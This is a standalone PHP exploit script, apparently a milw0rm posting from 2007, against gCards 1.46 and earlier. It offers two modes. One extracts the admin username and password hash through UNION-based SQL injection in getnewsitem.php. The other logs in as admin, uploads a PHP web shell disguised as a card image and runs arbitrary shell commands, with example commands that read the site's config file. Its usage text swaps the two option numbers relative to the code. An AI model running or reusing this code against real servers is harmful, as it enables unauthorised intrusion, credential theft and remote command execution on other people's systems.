#!/usr/bin/php -q -d short_open_tag=on
<?php

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

if ($argc<4) {
print "-------------------------------------------------------------------------\r\n";
print "        gCards <= 1.46 SQL Injection/Remote Code Execution Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "Usage: w4ck1ng_gcards.php [OPTION] [HOST] [PATH] ([USER] [PASS] [COMMAND])\r\n\r\n";
print "[OPTION]  = 0 = SQL Injection (Admin user & hash retrieval)\r\n";
print "            1 = Remote Code Execution\r\n";
print "[HOST] 	  = Target server's hostname or ip address\r\n";
print "[PATH] 	  = Path where gCards is located\r\n";
print "[USER] 	  = Admin's username\r\n";
print "[PASS] 	  = Admin's password\r\n";
print "[COMMAND] = Command to execute\r\n\r\n";
print "e.g. w4ck1ng_gcards.php 0 victim.com /gcards/\r\n";
print "     w4ck1ng_gcards.php 1 victim.com /gcards/ username password \"ls -lia\"\r\n";
print "     w4ck1ng_gcards.php 1 victim.com /gcards/ username password \"cat ../config.php\"\r\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";
die;
}


$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$exploit = $argv[1];
$host = $argv[2];
$path = $argv[3];
$user = $argv[4];
$pass = $argv[5];
$cmd  = $argv[6];
$cmd  = urlencode($cmd);
$port=80;$proxy="";

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

if ($exploit==0){

print "-------------------------------------------------------------------------\r\n";
print "        gCards <= 1.46 SQL Injection/Remote Code Execution Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";

    echo "\r\n[+] Logging in...";

    $data="username=" . $user;
    $data.="&userpass="  . $pass;
    $packet ="POST " . $path . "admin/admin.php HTTP/1.1\r\n";
    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Content-Length: ".strlen($data)."\r\n";
    $packet.="Connection: Close\r\n\r\n";
    $packet.=$data;

    sendpacketii($packet);

    if (strstr($html,"Authentication failed")){die("...Failed!\r\n"); exit();}
    else{echo "...Successful!\r\n";}
    $temp=explode("Set-Cookie: ",$html);
    $temp2=explode(" ",$temp[1]);
    $cookie=$temp2[0];

    $packet ="GET " . $path . "admin/cards.php HTTP/1.1\r\n";
    $packet.="Host: " . $host . "\r\n";
    $packet.="Cookie: " . $cookie . "\r\n";
    $packet.="Connection: Close\r\n\r\n";
    sendpacketii($packet);

    $temp3=explode("<option value=\"",$html);
    $temp4=explode("\"",$temp3[1]);

    $catid=$temp4[0];
    if ($catid=="") {$catid=1;}

    echo "[+] Uploading shell...";
$data='-----------------------------7d73d8371d06d2
Content-Disposition: form-data; name="MAX_FILE_SIZE"

250000
-----------------------------7d73d8371d06d2
Content-Disposition: form-data; name="cardname"

w4ck1ng
-----------------------------7d73d8371d06d2
Content-Disposition: form-data; name="catid"

'.$catid.'
-----------------------------7d73d8371d06d2
Content-Disposition: form-data; name="userfile"; filename="w4ck1ng.php"
Content-Type: application/octet-stream

<?php echo "<font color=\"#FFFFFF\">...Silentz</font>";ini_set("max_execution_time",0);passthru($_GET[cmd]);echo "<font color=\"#FFFFFF\">...Silentz</font>";?>
-----------------------------7d73d8371d06d2
Content-Disposition: form-data; name="userthumb"; filename="w4ck1ng.php"
Content-Type: application/octet-stream

<?php echo "<font color=\"#FFFFFF\">...Silentz</font>";ini_set("max_execution_time",0);passthru($_GET[cmd]);echo "<font color=\"#FFFFFF\">...Silentz</font>";?>
-----------------------------7d73d8371d06d2--
';
    $packet ="POST " . $path . "admin/upload.php HTTP/1.1\r\n";
    $packet.="Content-Type: multipart/form-data; boundary=---------------------------7d73d8371d06d2\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Content-Length: ".strlen($data)."\r\n";
    $packet.="Cookie: " . $cookie . "\r\n";
    $packet.="Connection: Close\r\n";
    $packet.="Cache-Control: no-cache\r\n\r\n";
    $packet.=$data;

    sendpacketii($packet);
    if (strstr($html,"successfully"))
    {echo "...Successful!\r\n";}
    else
    {die("...Failed!\r\n"); exit();}
    
    $packet ="GET " . $path . "admin/cards.php HTTP/1.1\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Cookie: " . $cookie . "\r\n";
    $packet.="Connection: Close\r\n\r\n";
    sendpacketii($packet);

    $temp=explode("w4ck1ng.php",$html);
    $temp2=explode("<td>",$temp[count($temp)-2]);
    $temp=$temp2[count($temp2)-1];
    $newfile=$temp."w4ck1ng.php";
    if ($newfile=="") {die("For some reason, exploit failed...");}
   
    echo "[+] Show time!!!\r\n\r\n";
    $packet ="GET " . $path . "images/".$newfile."?cmd=" . $cmd . " HTTP/1.1\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Connection: Close\r\n\r\n";
    sendpacketii($packet);

    if (strstr($html,"...Silentz"))
     {
       $temp=explode("...Silentz</font>",$html);
       $temp2=explode("<font color=\"#FFFFFF\">",$temp[1]);
       echo "===============================================================\r\n\r\n";
       echo $temp2[0];
       echo "\r\n===============================================================\r\n";
       echo "\r\n[+] Shell...http://" .$host.$path. "images/" . $newfile . "\r\n";

	print "-------------------------------------------------------------------------\r\n";
	print "            		 http://www.w4ck1ng.com\r\n";
	print "            		        ...Silentz\r\n";
	print "-------------------------------------------------------------------------\r\n";

       die;
     }

else{die(); exit();}}

if($exploit==1){

    $sql = "getnewsitem.php?newsid=999/**/UNION/**/SELECT/**/0,username,username,username,0/**/FROM/**/gc_cardusers/**/WHERE/**/userid=1/*";
    $packet ="GET " . $path . $sql . " HTTP/1.1\r\n";
    $packet.="Host: " . $host . "\r\n";
    $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\r\n";
    $packet.="Connection: Close\r\n\r\n";
    sendpacketii($packet);

    $temp = explode("<td><span class=\"bold\">",$html);
    $temp2 = explode("</span><br>",$temp[1]);
    $username = $temp2[0];

    if($username){

	print "-------------------------------------------------------------------------\r\n";
	print "        gCards <= 1.46 SQL Injection/Remote Code Execution Exploit\r\n";
	print "-------------------------------------------------------------------------\r\n";

    echo "[+] Admin User: " . $username . "\r\n";}


    $sql = "getnewsitem.php?newsid=999/**/UNION/**/SELECT/**/0,userpass,userpass,userpass,0/**/FROM/**/gc_cardusers/**/WHERE/**/userid=1/*";
    $packet ="GET " . $path . $sql . " HTTP/1.1\r\n";
    $packet.="Host: " . $host . "\r\n";
    $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\r\n";
    $packet.="Connection: Close\r\n\r\n";

    sendpacketii($packet);
    $temp = explode("<td><span class=\"bold\">",$html);
    $temp2 = explode("</span><br>",$temp[1]);
    $password = $temp2[0];

    if($username){

    echo "[+] Admin Hash: " . $password . "\r\n";

	print "-------------------------------------------------------------------------\r\n";
	print "            		 http://www.w4ck1ng.com\r\n";
	print "            		        ...Silentz\r\n";
	print "-------------------------------------------------------------------------\r\n";
 }
}
?>

# milw0rm.com [2007-05-25]